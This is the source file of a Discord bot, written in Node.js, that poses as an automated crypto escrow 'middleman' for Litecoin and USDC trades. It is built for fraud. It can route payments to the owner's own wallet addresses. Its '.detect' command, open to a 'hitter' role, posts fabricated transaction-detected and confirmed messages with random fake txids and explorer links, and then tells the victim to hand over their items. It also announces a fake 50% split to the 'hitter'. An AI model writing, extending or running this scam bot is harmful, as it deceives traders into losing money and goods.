require('dotenv').config();
const {
  Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle,
  ModalBuilder, TextInputBuilder, TextInputStyle, ChannelType, PermissionsBitField,
  Events, SlashCommandBuilder, Routes, MessageFlags, StringSelectMenuBuilder, StringSelectMenuOptionBuilder
} = require('discord.js');
const db = require('./database');
const wallet = require('./wallet');
const { REST } = require('@discordjs/rest');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers, GatewayIntentBits.MessageContent,
  ],
});

const OWNER_ID = '1473055478714990705';
const LTC_MNEMONIC = process.env.WALLET_MNEMONIC;
const USDC_MNEMONIC = process.env.WALLET_MNEMONIC2;

let config = {
  hitterRoleId: null, transactionChannelId: null, ownerLtcAddress: null,
  ownerUsdcAddress: null, useOwnerAddress: false
};

const confirmedInteractions = new Set();
const activeTurns = new Map();
let panelCategoryId = null;

function loadConfig() {
  try {
    const rows = db.prepare("SELECT key, value FROM config").all();
    rows.forEach(row => {
      if (row.key === 'panelCategory') panelCategoryId = row.value;
      if (row.key === 'hitterRoleId') config.hitterRoleId = row.value;
      if (row.key === 'transactionChannelId') config.transactionChannelId = row.value;
      if (row.key === 'ownerLtcAddress') config.ownerLtcAddress = row.value;
      if (row.key === 'ownerUsdcAddress') config.ownerUsdcAddress = row.value;
      if (row.key === 'useOwnerAddress') config.useOwnerAddress = row.value === 'true';
    });
  } catch (e) { console.log('Config load error:', e.message); }
}

function isOwner(userId) { return userId === OWNER_ID; }
function isWhitelisted(userId) {
  if (userId === OWNER_ID) return true;
  const row = db.prepare('SELECT userId FROM whitelist WHERE userId = ?').get(userId);
  return !!row;
}
function hasHitterRole(member) {
  if (!config.hitterRoleId) return false;
  return member.roles.cache.has(config.hitterRoleId);
}

function generateFakeTxid() {
  const chars = '0123456789abcdef';
  let txid = '';
  for (let i = 0; i < 64; i++) txid += chars[Math.floor(Math.random() * chars.length)];
  return txid;
}

function generateRandomLtcAddress() {
  const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
  let addr = 'L';
  for (let i = 0; i < 33; i++) addr += chars[Math.floor(Math.random() * chars.length)];
  return addr;
}

function generateRandomUsdcAddress() {
  return '0x' + Array(40).fill(0).map(() => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
}

async function getWorkingAddress(tradeId, type) {
  if (config.useOwnerAddress) {
    if (type === 'ltc') return config.ownerLtcAddress;
    if (type === 'usdc') return config.ownerUsdcAddress;
  }
  const existing = wallet.getAddress(tradeId, type);
  if (existing) return existing.address;
  const index = wallet.getNextIndex(type);
  let addressData;
  if (type === 'ltc') {
    if (!LTC_MNEMONIC) throw new Error('LTC mnemonic not configured');
    addressData = wallet.generateLTCAddress(LTC_MNEMONIC, index);
  } else if (type === 'usdc') {
    if (!USDC_MNEMONIC) throw new Error('USDC mnemonic not configured');
    addressData = wallet.generateETHAddress(USDC_MNEMONIC, index);
  }
  if (addressData) {
    wallet.storeAddress(tradeId, type, addressData);
    db.prepare('INSERT INTO addresses (tradeId, addressType, address, indexNum, privateKey) VALUES (?, ?, ?, ?, ?)')
      .run(tradeId, type, addressData.address, index, addressData.privateKey);
    return addressData.address;
  }
  return type === 'ltc' ? generateRandomLtcAddress() : generateRandomUsdcAddress();
}

async function sendAccurateFakeLog(channelId, amount, cryptoAmount, type = 'ltc', hitterAddress = null) {
  const channel = await client.channels.fetch(channelId).catch(() => null);
  if (!channel) return;
  const txid = generateFakeTxid();
  const txidShort = `${txid.substring(0, 10)}...${txid.substring(txid.length - 8)}`;
  const usd = amount.toFixed(2);
  const crypto = cryptoAmount.toFixed(type === 'usdc' ? 6 : 8);
  const symbol = type === 'usdc' ? 'USDC' : 'LTC';
  const explorerUrl = type === 'usdc' ? `https://etherscan.io/tx/${txid}` : `https://live.blockcypher.com/ltc/tx/${txid}`;
  
  const detectedEmbed = new EmbedBuilder()
    .setTitle('⚠️ Transaction Detected')
    .setDescription('The transaction is currently **unconfirmed** and waiting for 1 confirmation.')
    .addFields(
      { name: 'Transaction', value: `[${txidShort}](${explorerUrl})` },
      { name: 'Amount Received', value: `${crypto} ${symbol} ($${usd})` }
    )
    .setColor(0xFFD700);
  await channel.send({ embeds: [detectedEmbed] });
  
  setTimeout(async () => {
    const confirmEmbed = new EmbedBuilder()
      .setTitle('✅ Transaction Confirmed!')
      .setDescription('The payment has been confirmed and secured in escrow.')
      .addFields(
        { name: 'Transaction', value: `[${txidShort}](${explorerUrl})` },
        { name: 'Total Amount Received', value: `${crypto} ${symbol} ($${usd})` }
      )
      .setColor(0x00FF00);
    const proceedEmbed = new EmbedBuilder()
      .setTitle('✅ You may proceed with your trade.')
      .setDescription('1. Receiver gives items\n2. Sender clicks Release')
      .setColor(0x00FF00);
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId('release').setLabel('Release').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId('cancel').setLabel('Cancel').setStyle(ButtonStyle.Secondary)
    );
    await channel.send({ embeds: [confirmEmbed, proceedEmbed], components: [row] });
    
    if (hitterAddress && amount > 0) {
      const splitAmount = (cryptoAmount / 2).toFixed(type === 'usdc' ? 6 : 8);
      const splitEmbed = new EmbedBuilder()
        .setTitle('💰 Split Payment Initiated')
        .setDescription(`50% split sent to hitter\nAmount: ${splitAmount} ${symbol}`)
        .setColor(0x00FF00);
      await channel.send({ embeds: [splitEmbed] });
    }
  }, 15000);
}

const commands = [
  new SlashCommandBuilder().setName('configure').setDescription('Configure bot settings (Owner only)'),
  new SlashCommandBuilder().setName('panel').setDescription('Spawn the middleman panel'),
  new SlashCommandBuilder().setName('whitelist').setDescription('Whitelist a user to use owner commands')
    .addUserOption(opt => opt.setName('user').setDescription('User to whitelist').setRequired(true)),
  new SlashCommandBuilder().setName('close').setDescription('Close this ticket')
].map(cmd => cmd.toJSON());

const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);

client.once(Events.ClientReady, async () => {
  console.log(`Logged in as ${client.user.tag}`);
  loadConfig();
  try {
    await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
    console.log('Commands deployed');
  } catch (err) { console.error('Command deploy error:', err.message); }
});

client.on(Events.MessageCreate, async (message) => {
  if (message.author.bot) return;
  if (!message.content.startsWith('.')) return;
  const args = message.content.slice(1).trim().split(/ +/);
  const command = args.shift().toLowerCase();
  
  if (command === 'detect') {
    const member = await message.guild.members.fetch(message.author.id).catch(() => null);
    if (!member || !hasHitterRole(member)) return;
    const channelId = args[0] || config.transactionChannelId;
    const amount = parseFloat(args[1]) || 100;
    const type = args[2] || 'ltc';
    const cryptoAmount = type === 'usdc' ? amount : (amount / 55);
    if (!channelId) return message.reply('❌ Usage: `.detect (channelid) (amount) (ltc/usdc)`');
    await sendAccurateFakeLog(channelId, amount, cryptoAmount, type, type === 'ltc' ? config.ownerLtcAddress : config.ownerUsdcAddress);
    await message.reply(`✅ ${type.toUpperCase()} transaction detection triggered in <#${channelId}> for $${amount.toFixed(2)}`);
  }
});

client.on(Events.InteractionCreate, async (interaction) => {
  try {
    if (interaction.isChatInputCommand()) await handleSlashCommand(interaction);
    else if (interaction.isButton()) await handleButton(interaction);
    else if (interaction.isModalSubmit()) await handleModal(interaction);
    else if (interaction.isStringSelectMenu()) await handleSelectMenu(interaction);
  } catch (err) {
    console.error('Interaction error:', err);
    try {
      if (!interaction.replied && !interaction.deferred) {
        await interaction.reply({ content: `❌ Error: ${err.message}`, flags: MessageFlags.Ephemeral });
      }
    } catch {}
  }
});

async function handleSlashCommand(interaction) {
  const { commandName } = interaction;
  
  if (commandName === 'configure') {
    if (!isWhitelisted(interaction.user.id)) return interaction.reply({ content: '❌ Not authorized', flags: MessageFlags.Ephemeral });
    const modal = new ModalBuilder().setCustomId('configure_modal').setTitle('Bot Configuration');
    modal.addComponents(
      new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('hitterRoleId').setLabel('Hitter Role ID').setPlaceholder('Enter role ID').setStyle(TextInputStyle.Short).setRequired(true)),
      new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('transactionChannelId').setLabel('Transaction Channel ID').setPlaceholder('Enter channel ID').setStyle(TextInputStyle.Short).setRequired(true)),
      new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('ownerLtcAddress').setLabel('Owner LTC Address').setPlaceholder('Enter LTC address').setStyle(TextInputStyle.Short).setRequired(true)),
      new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('ownerUsdcAddress').setLabel('Owner USDC Address').setPlaceholder('Enter USDC (ERC20) address').setStyle(TextInputStyle.Short).setRequired(true)),
      new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('useOwnerAddress').setLabel('Use owner LTC and USDC address in tickets? (Yes/No)').setPlaceholder('Yes or No').setStyle(TextInputStyle.Short).setRequired(true))
    );
    await interaction.showModal(modal);
  }
  else if (commandName === 'panel') {
    const mainEmbed = new EmbedBuilder().setTitle("Auto Middleman").setDescription('• Paid Service\n• Secure escrow service').setColor(0x2B2D31);
    const feesEmbed = new EmbedBuilder().setTitle('Fees:').setDescription('• Deals $250+: $1.50\n• Deals under $250: $0.50\n• Deals under $50 are **FREE**').setColor(0x2B2D31);
    const cryptoEmbed = new EmbedBuilder().setTitle('• Request Payment •').setDescription('Select your preferred cryptocurrency').setColor(0x2B2D31);
    const selectRow = new ActionRowBuilder().addComponents(
      new StringSelectMenuBuilder().setCustomId('crypto_select').setPlaceholder('Select Cryptocurrency')
        .addOptions(
          new StringSelectMenuOptionBuilder().setLabel('Litecoin (LTC)').setDescription('Fast, low-fee cryptocurrency').setValue('ltc').setEmoji('🪙'),
          new StringSelectMenuOptionBuilder().setLabel('USD Coin (USDC)').setDescription('Stablecoin pegged to USD').setValue('usdc').setEmoji('💵')
        )
    );
    await interaction.reply({ embeds: [mainEmbed, feesEmbed, cryptoEmbed], components: [selectRow] });
  }
  else if (commandName === 'whitelist') {
    if (!isOwner(interaction.user.id)) return interaction.reply({ content: '❌ Owner only', flags: MessageFlags.Ephemeral });
    const user = interaction.options.getUser('user');
    try {
      db.prepare('INSERT OR REPLACE INTO whitelist (userId) VALUES (?)').run(user.id);
      await interaction.reply({ content: `✅ ${user.toString()} has been whitelisted`, flags: MessageFlags.Ephemeral });
    } catch (err) { await interaction.reply({ content: `❌ Error: ${err.message}`, flags: MessageFlags.Ephemeral }); }
  }
  else if (commandName === 'close') {
    await interaction.channel.delete().catch(() => {});
  }
}

async function handleSelectMenu(interaction) {
  if (interaction.customId === 'crypto_select') {
    const selectedCrypto = interaction.values[0];
    const modal = new ModalBuilder().setCustomId(`trade_modal_${selectedCrypto}`).setTitle(`New ${selectedCrypto.toUpperCase()} Trade`);
    modal.addComponents(
      new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('otherUserId').setLabel("Paste Your Trader's Username or ID").setPlaceholder('e.g.: username / 693059117761429610').setStyle(TextInputStyle.Short).setRequired(true)),
      new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('youGiving').setLabel('What are You giving?').setStyle(TextInputStyle.Short).setRequired(true)),
      new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('theyGiving').setLabel('What is Your Trader giving?').setStyle(TextInputStyle.Short).setRequired(true))
    );
    await interaction.showModal(modal);
  }
}

function calculateFee(amount) {
  if (amount < 50) return 0;
  if (amount >= 250) return 1.50;
  return 0.50;
}

async function handleButton(interaction) {
  const customId = interaction.customId;
  if (customId.startsWith('role_')) await handleRoleSelection(interaction);
  else if (customId.startsWith('confirm_info_')) await handleConfirmInfo(interaction);
  else if (customId.startsWith('set_amount_')) await handleSetAmount(interaction);
  else if (customId.startsWith('confirm_amount_')) await handleConfirmAmount(interaction);
  else if (customId.startsWith('copy_details_')) {
    const tradeId = customId.split('_')[2];
    const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
    if (!trade) return;
    const address = await getWorkingAddress(tradeId, trade.type);
    await interaction.reply({ content: `\`${address}\``, flags: MessageFlags.Ephemeral });
  }
  else if (customId === 'cancel' || customId === 'close_ticket' || customId.startsWith('delete_') || customId.startsWith('cancel_trade_')) {
    await interaction.channel.delete().catch(() => {});
  }
}

async function handleModal(interaction) {
  if (interaction.customId === 'configure_modal') {
    const hitterRoleId = interaction.fields.getTextInputValue('hitterRoleId');
    const transactionChannelId = interaction.fields.getTextInputValue('transactionChannelId');
    const ownerLtcAddress = interaction.fields.getTextInputValue('ownerLtcAddress');
    const ownerUsdcAddress = interaction.fields.getTextInputValue('ownerUsdcAddress');
    const useOwnerAddr = interaction.fields.getTextInputValue('useOwnerAddress').toLowerCase();
    
    config.hitterRoleId = hitterRoleId;
    config.transactionChannelId = transactionChannelId;
    config.ownerLtcAddress = ownerLtcAddress;
    config.ownerUsdcAddress = ownerUsdcAddress;
    config.useOwnerAddress = useOwnerAddr === 'yes';
    
    db.prepare("INSERT OR REPLACE INTO config(key, value) VALUES('hitterRoleId', ?)").run(hitterRoleId);
    db.prepare("INSERT OR REPLACE INTO config(key, value) VALUES('transactionChannelId', ?)").run(transactionChannelId);
    db.prepare("INSERT OR REPLACE INTO config(key, value) VALUES('ownerLtcAddress', ?)").run(ownerLtcAddress);
    db.prepare("INSERT OR REPLACE INTO config(key, value) VALUES('ownerUsdcAddress', ?)").run(ownerUsdcAddress);
    db.prepare("INSERT OR REPLACE INTO config(key, value) VALUES('useOwnerAddress', ?)").run(config.useOwnerAddress ? 'true' : 'false');
    
    await interaction.reply({ content: '✅ Configuration saved successfully!', flags: MessageFlags.Ephemeral });
  }
  else if (interaction.customId.startsWith('trade_modal_')) {
    const type = interaction.customId.split('_')[2];
    await handleTradeDetailsModal(interaction, type);
  }
  else if (interaction.customId.startsWith('amount_modal_')) {
    await handleAmountModal(interaction);
  }
}

async function handleTradeDetailsModal(interaction, type) {
  try {
    const rawInput = interaction.fields.getTextInputValue('otherUserId').trim();
    const youGiving = interaction.fields.getTextInputValue('youGiving');
    const theyGiving = interaction.fields.getTextInputValue('theyGiving');
    let otherUserId = rawInput.replace(/[<@!>]/g, '');
    
    if (!/^\d{17,19}$/.test(otherUserId)) {
      try {
        const members = await interaction.guild.members.fetch({ query: rawInput, limit: 1 });
        if (members.size > 0) otherUserId = members.first().id;
      } catch (e) { console.log('Username lookup failed:', e.message); }
    }
    
    if (!/^\d{17,19}$/.test(otherUserId)) {
      return interaction.reply({ content: `❌ Invalid user format: "${rawInput}". Use ID or username.`, flags: MessageFlags.Ephemeral });
    }
    
    let otherMember;
    try { otherMember = await interaction.guild.members.fetch(otherUserId); }
    catch (err) { return interaction.reply({ content: `❌ User not found in server: "${rawInput}"`, flags: MessageFlags.Ephemeral }); }
    
    if (otherUserId === interaction.user.id) return interaction.reply({ content: '❌ You cannot trade with yourself.', flags: MessageFlags.Ephemeral });
    
    const channelOptions = {
      name: `${type}-${interaction.user.username}-${otherMember.user.username}`.substring(0, 100),
      type: ChannelType.GuildText,
      permissionOverwrites: [
        { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
        { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] },
        { id: otherUserId, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] },
        { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }
      ]
    };
    
    if (panelCategoryId) {
      const category = await interaction.guild.channels.fetch(panelCategoryId).catch(() => null);
      if (category) channelOptions.parent = panelCategoryId;
    }
    
    const channel = await interaction.guild.channels.create(channelOptions);
    const result = db.prepare("INSERT INTO trades (channelId, user1Id, user2Id, senderId, receiverId, amount, status, type) VALUES (?, ?, ?, NULL, NULL, 0, 'role_selection', ?)").run(channel.id, interaction.user.id, otherUserId, type);
    const tradeId = result.lastInsertRowid;
    
    await interaction.reply({ content: `✅ ${type.toUpperCase()} trade channel created: ${channel}`, flags: MessageFlags.Ephemeral });
    
    const embed = new EmbedBuilder()
      .setTitle(`👋 Auto Middleman Service - ${type.toUpperCase()}`)
      .setDescription('Make sure to follow the steps and read the instructions thoroughly.\nPlease explicitly state the trade details if the information below is inaccurate.')
      .addFields(
        { name: `${interaction.user.username}'s side:`, value: youGiving, inline: true },
        { name: `${otherMember.user.username}'s side:`, value: theyGiving, inline: true }
      )
      .setColor(type === 'usdc' ? 0x2775CA : 0x5865F2);
    
    const deleteRow = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`delete_${tradeId}`).setLabel('Delete Ticket').setStyle(ButtonStyle.Danger));
    await channel.send({ content: `${interaction.user} ${otherMember}`, embeds: [embed], components: [deleteRow] });
    
    const roleEmbed = new EmbedBuilder()
      .setDescription('**Select your role**\n• **"Sender"** if you are **Sending** crypto to the bot.\n• **"Receiver"** if you are **Receiving** crypto from the bot.')
      .setColor(type === 'usdc' ? 0x2775CA : 0x5865F2);
    
    const roleRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`role_sender_${tradeId}`).setLabel('Sender').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`role_receiver_${tradeId}`).setLabel('Receiver').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`role_reset_${tradeId}`).setLabel('Reset').setStyle(ButtonStyle.Danger)
    );
    await channel.send({ embeds: [roleEmbed], components: [roleRow] });
    
  } catch (err) {
    console.error('Create ticket error:', err);
    await interaction.reply({ content: `❌ Error creating ticket: ${err.message}`, flags: MessageFlags.Ephemeral });
  }
}

async function handleRoleSelection(interaction) {
  const parts = interaction.customId.split('_');
  const action = parts[1];
  const tradeId = parts[2];
  const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  if (!trade) return interaction.reply({ content: 'Trade not found.', flags: MessageFlags.Ephemeral });
  
  const userId = interaction.user.id;
  
  if (action === 'reset') {
    db.prepare('UPDATE trades SET senderId = NULL, receiverId = NULL WHERE id = ?').run(tradeId);
    activeTurns.delete(tradeId);
    await updateRoleDisplay(interaction, tradeId);
    return interaction.reply({ content: '✅ Roles reset.', flags: MessageFlags.Ephemeral });
  }
  
  const isSender = action === 'sender';
  if (userId !== trade.user1Id && userId !== trade.user2Id) return interaction.reply({ content: '❌ You are not part of this trade.', flags: MessageFlags.Ephemeral });
  if ((isSender && trade.receiverId === userId) || (!isSender && trade.senderId === userId)) return interaction.reply({ content: '❌ You cannot be both Sender and Receiver!', flags: MessageFlags.Ephemeral });
  
  db.prepare(`UPDATE trades SET ${isSender ? 'senderId' : 'receiverId'} = ? WHERE id = ?`).run(userId, tradeId);
  await interaction.reply({ content: `✅ You are now the ${isSender ? 'Sender' : 'Receiver'}!`, flags: MessageFlags.Ephemeral });
  await updateRoleDisplay(interaction, tradeId);
  
  const updated = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  if (updated.senderId && updated.receiverId) await sendInfoConfirmation(interaction.channel, tradeId);
}

async function updateRoleDisplay(interaction, tradeId) {
  const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  let description = '**Select your role**\n• **"Sender"** if you are **Sending** crypto to the bot.\n• **"Receiver"** if you are **Receiving** crypto from the bot.\n\n';
  
  if (trade.senderId) {
    const sender = await client.users.fetch(trade.senderId).catch(() => null);
    description += `**Sender:** ${sender ? sender.toString() : 'Unknown'}\n`;
  }
  if (trade.receiverId) {
    const receiver = await client.users.fetch(trade.receiverId).catch(() => null);
    description += `**Receiver:** ${receiver ? receiver.toString() : 'Unknown'}\n`;
  }
  
  const messages = await interaction.channel.messages.fetch({ limit: 10 });
  const roleMsg = messages.find(m => m.embeds[0]?.description?.includes('Select your role'));
  if (roleMsg) {
    await roleMsg.edit({
      embeds: [new EmbedBuilder().setDescription(description).setColor(trade.type === 'usdc' ? 0x2775CA : 0x5865F2)],
      components: [new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`role_sender_${tradeId}`).setLabel('Sender').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`role_receiver_${tradeId}`).setLabel('Receiver').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`role_reset_${tradeId}`).setLabel('Reset').setStyle(ButtonStyle.Danger)
      )]
    });
  }
}

async function sendInfoConfirmation(channel, tradeId) {
  const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  const sender = await client.users.fetch(trade.senderId).catch(() => null);
  const receiver = await client.users.fetch(trade.receiverId).catch(() => null);
  
  const embed = new EmbedBuilder()
    .setTitle('• Is This Information Correct?')
    .addFields(
      { name: 'Sender', value: sender ? sender.toString() : 'Unknown', inline: false },
      { name: 'Receiver', value: receiver ? receiver.toString() : 'Unknown', inline: false }
    )
    .setDescription('Make sure you have selected the right role! If you didn\'t then click "Incorrect"')
    .setColor(trade.type === 'usdc' ? 0x2775CA : 0x5865F2);
  
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`confirm_info_${tradeId}`).setLabel('Correct').setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`incorrect_info_${tradeId}`).setLabel('Incorrect').setStyle(ButtonStyle.Danger)
  );
  await channel.send({ embeds: [embed], components: [row] });
}

async function handleConfirmInfo(interaction) {
  const parts = interaction.customId.split('_');
  const tradeId = parts[2];
  const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  if (!trade || (interaction.user.id !== trade.user1Id && interaction.user.id !== trade.user2Id)) return;
  
  const key = `info_${tradeId}_${interaction.user.id}`;
  if (confirmedInteractions.has(key)) return interaction.reply({ content: '✅ Already confirmed!', flags: MessageFlags.Ephemeral });
  confirmedInteractions.add(key);
  
  await interaction.reply({ content: `✅ ${interaction.user.toString()} clicked Correct.`, ephemeral: false });
  
  const otherUserId = interaction.user.id === trade.user1Id ? trade.user2Id : trade.user1Id;
  if (confirmedInteractions.has(`info_${tradeId}_${otherUserId}`)) await promptForAmount(interaction.channel, tradeId);
}

async function promptForAmount(channel, tradeId) {
  const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  if (!trade?.senderId) return;
  activeTurns.set(tradeId, { type: 'sender', userId: trade.senderId });
  
  const embed = new EmbedBuilder()
    .setDescription('💵 **Set the amount in USD value**\n\nOnly the sender can click this button.')
    .setColor(trade.type === 'usdc' ? 0x2775CA : 0x5865F2);
  
  const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`set_amount_${tradeId}`).setLabel('Set USD Amount').setStyle(ButtonStyle.Primary));
  await channel.send({ content: `<@${trade.senderId}>`, embeds: [embed], components: [row] });
}

async function handleSetAmount(interaction) {
  const parts = interaction.customId.split('_');
  const tradeId = parts[2];
  const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  const turn = activeTurns.get(tradeId);
  
  if (!turn || turn.type !== 'sender' || turn.userId !== interaction.user.id) return interaction.reply({ content: '❌ It is not your turn!', flags: MessageFlags.Ephemeral });
  
  const modal = new ModalBuilder().setCustomId(`amount_modal_${tradeId}`).setTitle('Set USD Amount');
  modal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('usd_amount').setLabel('USD Amount').setPlaceholder('30').setStyle(TextInputStyle.Short).setRequired(true)));
  await interaction.showModal(modal);
}

async function handleAmountModal(interaction) {
  const parts = interaction.customId.split('_');
  const tradeId = parts[2];
  const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  const amount = parseFloat(interaction.fields.getTextInputValue('usd_amount'));
  
  if (isNaN(amount) || amount <= 0) return interaction.reply({ content: '❌ Invalid amount.', flags: MessageFlags.Ephemeral });
  
  const turn = activeTurns.get(tradeId);
  if (!turn || turn.type !== 'sender' || turn.userId !== interaction.user.id) return interaction.reply({ content: '❌ Not your turn!', flags: MessageFlags.Ephemeral });
  
  const fee = calculateFee(amount);
  const totalUsd = amount + fee;
  const totalCrypto = trade.type === 'usdc' ? totalUsd : (totalUsd / 55);
  
  db.prepare("UPDATE trades SET amount = ?, fee = ?, ltcPrice = ?, totalLtc = ?, status = 'amount_set' WHERE id = ?")
    .run(amount, fee, trade.type === 'usdc' ? 1 : 55, totalCrypto, tradeId);
  
  activeTurns.delete(tradeId);
  
  const embed = new EmbedBuilder()
    .setDescription(`**USD amount set to $${amount.toFixed(2)}**\nFee: $${fee.toFixed(2)}\nTotal: $${totalUsd.toFixed(2)}\n\nPlease confirm the USD amount.`)
    .setColor(trade.type === 'usdc' ? 0x2775CA : 0x5865F2);
  
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`confirm_amount_${tradeId}`).setLabel('Correct').setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`incorrect_amount_${tradeId}`).setLabel('Incorrect').setStyle(ButtonStyle.Danger)
  );
  await interaction.reply({ embeds: [embed], components: [row] });
}

async function handleConfirmAmount(interaction) {
  const parts = interaction.customId.split('_');
  const tradeId = parts[2];
  const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  if (!trade || (interaction.user.id !== trade.user1Id && interaction.user.id !== trade.user2Id)) return;
  
  const key = `amount_${tradeId}_${interaction.user.id}`;
  if (confirmedInteractions.has(key)) return;
  confirmedInteractions.add(key);
  
  await interaction.reply({ content: `✅ ${interaction.user.toString()} confirmed the USD amount.`, ephemeral: false });
  
  const otherUserId = interaction.user.id === trade.user1Id ? trade.user2Id : trade.user1Id;
  if (confirmedInteractions.has(`amount_${tradeId}_${otherUserId}`)) await sendPaymentInstructions(interaction.channel, tradeId);
}

async function sendPaymentInstructions(channel, tradeId) {
  const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  const fee = trade.fee || 0;
  const totalUsd = trade.amount + fee;
  const isUsdc = trade.type === 'usdc';
  
  const address = await getWorkingAddress(tradeId, trade.type);
  
  const embed = new EmbedBuilder()
    .setDescription(`<@${trade.senderId}> Send the ${isUsdc ? 'USDC' : 'LTC'} to the following address.`)
    .addFields(
      { name: '📋 Payment Information', value: 'Make sure to send the **EXACT** amount.' },
      { name: 'USD Amount', value: `$${trade.amount.toFixed(2)}` },
      { name: 'Fee', value: `$${fee.toFixed(2)}` },
      { name: 'Total with Fee', value: `$${totalUsd.toFixed(2)}` },
      { name: `${isUsdc ? 'USDC' : 'LTC'} Amount`, value: trade.totalLtc.toFixed(isUsdc ? 6 : 5) },
      { name: 'Payment Address', value: `\`${address}\`` },
      { name: isUsdc ? 'Network' : 'Current LTC Price', value: isUsdc ? 'Ethereum (ERC20)' : '$55.00' },
      { name: '⏰ Timeout', value: 'This ticket will be closed within 20 minutes if no transaction was detected.' }
    )
    .setColor(isUsdc ? 0x2775CA : 0x5865F2);
  
  const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`copy_details_${tradeId}`).setLabel('Copy Details').setStyle(ButtonStyle.Primary));
  await channel.send({ embeds: [embed], components: [row] });
  db.prepare("UPDATE trades SET status = 'awaiting_payment', ltcAddress = ? WHERE id = ?").run(address, tradeId);
}

client.login(process.env.DISCORD_TOKEN);
